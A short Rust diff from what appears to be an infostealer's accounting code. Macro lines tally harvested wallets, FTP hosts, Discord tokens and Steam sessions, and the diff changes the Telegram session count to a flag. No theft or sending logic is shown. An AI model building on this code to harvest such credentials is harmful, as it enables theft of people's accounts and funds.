@@ -41,7 +41,7 @@ pub trait Browser: Send + Sync {
 pub trait Software: Send + Sync {
     increase_count!(wallets);
     increase_count!(ftp_hosts);
-    increase_count!(telegram_sessions);
+    flag!(telegram);
     increase_count!(discord_tokens);
     increase_count!(steam_session);
 }
